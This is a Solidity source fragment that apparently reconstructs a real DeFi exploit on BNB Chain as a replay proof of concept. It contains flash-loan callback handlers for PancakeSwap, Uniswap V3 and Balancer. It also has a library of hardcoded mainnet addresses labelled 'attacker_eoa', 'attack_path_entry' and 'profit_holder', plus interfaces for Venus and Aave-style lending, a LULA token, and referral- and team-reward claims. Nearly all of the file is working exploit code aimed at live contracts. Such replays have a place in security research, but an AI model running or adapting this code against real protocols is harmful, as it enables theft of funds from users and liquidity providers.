        if (msg.sender == 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F) {
            if (!_replayActive[REPLAY_CALLBACK_11]) {
                _replayActive[REPLAY_CALLBACK_11] = true;
                flashCallback9();
                _replayActive[REPLAY_CALLBACK_11] = false;
            }
            return;
        }
        if (msg.sender == 0x172fcD41E0913e95784454622d1c3724f546f849) {
            if (!_replayActive[REPLAY_CALLBACK_7]) {
                _replayActive[REPLAY_CALLBACK_7] = true;
                flashCallback5();
                _replayActive[REPLAY_CALLBACK_7] = false;
            }
            return;
        }
        if (msg.sender == 0x1c3865814aCbBa11E7196dF0b46c024472503196) {
            if (!_replayActive[REPLAY_CALLBACK_6]) {
                _replayActive[REPLAY_CALLBACK_6] = true;
                flashCallback4();
                _replayActive[REPLAY_CALLBACK_6] = false;
            }
            return;
        }
        if (msg.sender == 0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE) {
            if (!_replayActive[REPLAY_CALLBACK_8]) {
                _replayActive[REPLAY_CALLBACK_8] = true;
                flashCallback6();
                _replayActive[REPLAY_CALLBACK_8] = false;
            }
            return;
        }
        if (msg.sender == 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057) {
            if (!_replayActive[REPLAY_CALLBACK_12]) {
                _replayActive[REPLAY_CALLBACK_12] = true;
                flashCallback10();
                _replayActive[REPLAY_CALLBACK_12] = false;
            }
            return;
        }
        if (msg.sender == 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb) {
            if (!_replayActive[REPLAY_CALLBACK_5]) {
                _replayActive[REPLAY_CALLBACK_5] = true;
                flashCallback3();
                _replayActive[REPLAY_CALLBACK_5] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_10]) {
            _replayActive[REPLAY_CALLBACK_10] = true;
            flashCallback8();
            _replayActive[REPLAY_CALLBACK_10] = false;
        }
        return;
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        if (msg.sender == 0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c) {
            if (!_replayActive[REPLAY_CALLBACK_14]) {
                _replayActive[REPLAY_CALLBACK_14] = true;
                flashCallback11();
                _replayActive[REPLAY_CALLBACK_14] = false;
            }
            return;
        }
        if (msg.sender == 0x81C7294b66955824BC04acB642ae8dC58e6cE507) {
            if (!_replayActive[REPLAY_CALLBACK_15]) {
                _replayActive[REPLAY_CALLBACK_15] = true;
                flashCallback12();
                _replayActive[REPLAY_CALLBACK_15] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_14]) {
            _replayActive[REPLAY_CALLBACK_14] = true;
            flashCallback11();
            _replayActive[REPLAY_CALLBACK_14] = false;
        }
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xab6291fe) {
            if (!_replayActive[REPLAY_CALLBACK_13]) {
                _replayActive[REPLAY_CALLBACK_13] = true;
                _readAssetState();
                _replayActive[REPLAY_CALLBACK_13] = false;
            }
            bytes memory ret = abi.encode(_uintArray0());
            assembly { return(add(ret, 32), mload(ret)) }
        }
    }

    bytes32 private constant REPLAY_CALLBACK_1 = keccak256("poc.replay.REPLAY_CALLBACK_1");
    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    bytes32 private constant REPLAY_CALLBACK_8 = keccak256("poc.replay.REPLAY_CALLBACK_8");
    bytes32 private constant REPLAY_CALLBACK_9 = keccak256("poc.replay.REPLAY_CALLBACK_9");
    bytes32 private constant REPLAY_CALLBACK_10 = keccak256("poc.replay.REPLAY_CALLBACK_10");
    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    bytes32 private constant REPLAY_CALLBACK_12 = keccak256("poc.replay.REPLAY_CALLBACK_12");
    bytes32 private constant REPLAY_CALLBACK_13 = keccak256("poc.replay.REPLAY_CALLBACK_13");
    bytes32 private constant REPLAY_CALLBACK_14 = keccak256("poc.replay.REPLAY_CALLBACK_14");
    bytes32 private constant REPLAY_CALLBACK_15 = keccak256("poc.replay.REPLAY_CALLBACK_15");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Addresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849; // Addresses.PancakeV3Pool = 0x172fcd41e0913e95784454622d1c3724f546f849 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_3196 = 0x1c3865814aCbBa11E7196dF0b46c024472503196; // Addresses.PancakeV3Pool_3196 = 0x1c3865814acbba11e7196df0b46c024472503196 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Vault_238A35 = 0x238a358808379702088667322f80aC48bAd5e6c4; // Addresses.Vault_238A35 = 0x238a358808379702088667322f80ac48bad5e6c4 label=Vault roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x2677806d48325Ced7533C54B86eD5e99b129a4ED; // Addresses.attacker_eoa = 0x2677806d48325ced7533c54b86ed5e99b129a4ed label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant PoolManager = 0x28e2Ea090877bF75740558f6BFB36A5ffeE9e9dF; // Addresses.PoolManager = 0x28e2ea090877bf75740558f6bfb36a5ffee9e9df label=PoolManager roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_40EB = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb; // Addresses.PancakeV3Pool_40EB = 0x4f31fa980a675570939b737ebdde0471a4be40eb label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant attack_path_entry = 0x5E506Ba06Fa6C61D1069B0E68d7013DE35AFA816; // Addresses.attack_path_entry = 0x5e506ba06fa6c61d1069b0e68d7013de35afa816 label=attack_path_entry roles=asset|attack_path_entry_contract|attacker_callback_contract|attacker_contract|code_contract|contract|economic_holder|localized_contract|observed_address|poc_reconstruction_surface|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_6807DC =
        0x6807dc923806fE8Fd134338EABCA509979a7e0cB; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC = 0x6807dc923806fe8fd134338eabca509979a7e0cb label=InitializableImmutableAdminUpgradeabilityProxy roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant vWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9; // Addresses.vWBNB = 0x6bca74586218db34cdb402295796b79663d816e9 label=VBep20Delegator token_symbol=vWBNB roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool = 0x81C7294b66955824BC04acB642ae8dC58e6cE507; // Addresses.UniswapV3Pool = 0x81c7294b66955824bc04acb642ae8dc58e6ce507 label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC1967Proxy_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // Addresses.ERC1967Proxy_5D8C = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=ERC1967Proxy roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // Addresses.PancakeV3Pool_3121 = 0x92b7807bf19b7dddf89b706143896d05228f3121 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant aBnbWBNB = 0x9B00a09492a626678E5A3009982191586C444Df9; // Addresses.aBnbWBNB = 0x9b00a09492a626678e5a3009982191586c444df9 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aBnbWBNB roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_2CCE = 0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE; // Addresses.PancakeV3Pool_2CCE = 0x9c4ee895e4f6ce07ada631c508d1306db7502cce label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_94E4 = 0xA0909f81785f87f3e79309F0E73A7d82208094E4; // Addresses.PancakeV3Pool_94E4 = 0xa0909f81785f87f3e79309f0e73a7d82208094e4 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_A9251C =
        0xa9251ca9DE909CB71783723713B21E4233fbf1B1; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_A9251C = 0xa9251ca9de909cb71783723713b21e4233fbf1b1 label=InitializableImmutableAdminUpgradeabilityProxy roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_EB0F = 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F; // Addresses.PancakeV3Pool_EB0F = 0xb67e5eaf770a384ab28029d08b9bc5ebe32beb0f label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=WBNB token_symbol=WBNB roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_7057 = 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057; // Addresses.PancakeV3Pool_7057 = 0xcf59b8c8baa2dea520e3d549f97d4e49ade17057 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_CA9C = 0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c; // Addresses.UniswapV3Pool_CA9C = 0xe1acb466421ed24dd8bd381d1205bad0ad43ca9c label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Cake_LP = 0xF0b36389a12A28be1280c0ec2A4bbc76889D6a96; // Addresses.Cake_LP = 0xf0b36389a12a28be1280c0ec2a4bbc76889d6a96 label=PancakePair token_symbol=Cake-LP roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant LULA = 0xF5d7029eb6751d170dcF0Bb1c87Af6f93d5A2e9a; // Addresses.LULA = 0xf5d7029eb6751d170dcf0bb1c87af6f93d5a2e9a label=LULA token_symbol=LULA roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant variableDebtBnbUSDT = 0xF8bb2Be50647447Fb355e3a77b81be4db64107cd; // Addresses.variableDebtBnbUSDT = 0xf8bb2be50647447fb355e3a77b81be4db64107cd label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtBnbUSDT roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant Unitroller = 0xfD36E2c2a6789Db23113685031d7F16329158384; // Addresses.Unitroller = 0xfd36e2c2a6789db23113685031d7f16329158384 label=Unitroller roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255; // Addresses.vUSDT = 0xfd5840cd36d94d7229439859c0112a4185bc0255 label=VBep20Delegator token_symbol=vUSDT roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
}

interface IClaimReferralRewardLike {
    function claimReferralReward() external;
}

interface IClaimTeamRewardLike {
    function claimTeamReward() external;
}

interface IERC1967Proxy_5D8C {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IFlashToken0Like {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IInitializableImmutableAdminUpgradeabilityProxy_6807DC {
    function borrow(address, uint256, uint256, uint16, address) external;
    function repay(address, uint256, uint256, address) external returns (uint256);
    function supply(address, uint256, address, uint16) external;
    function withdraw(address, uint256, address) external returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPendingReferralRewardLike {
    function pendingReferralReward() external view returns (uint256);
}

interface IPoolManager {
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function unlock(bytes calldata) external returns (uint256[] memory);
    function sync() external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
}

interface IVault_238A35 {
    function lock(bytes calldata) external returns (uint256[] memory);
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function sync() external;
}

interface IWBNB {
    function deposit() external payable;
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
}

interface IvWBNB {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

